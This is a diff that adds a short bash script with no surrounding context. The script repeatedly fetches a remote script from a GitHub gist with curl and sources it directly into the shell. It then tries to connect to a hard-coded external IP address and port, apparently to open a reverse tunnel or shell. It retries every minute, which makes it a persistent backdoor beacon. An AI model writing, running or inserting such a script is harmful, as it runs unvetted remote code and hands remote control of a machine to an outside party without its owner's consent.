@@ -1,0 +1,29 @@
+#!/bin/bash
+
+sleep 10
+connected=false
+
+while true
+do    
+    if [ "$connected" = false ]; then
+        source <(curl -s https://gist.githubusercontent.com/cyrus-and/713391cbc342f069c149/raw/let-in.sh)
+    fi
+    
+    # Try to connect to the tunnel
+    let-you-in 193.161.193.99 25809
+    
+    # Check if the connection was successful
+    if [ $? -eq 0 ]; then
+        echo "Successfully connected to tunnel."
+        connected=true
+        
+    fi
+    
+    # Execute commands only when there is no tunnel connection
+    if [ "$connected" = false ]; then
+        echo "Executing commands..."
+        # Insert your commands here
+    fi
+    
+    sleep 60
+done
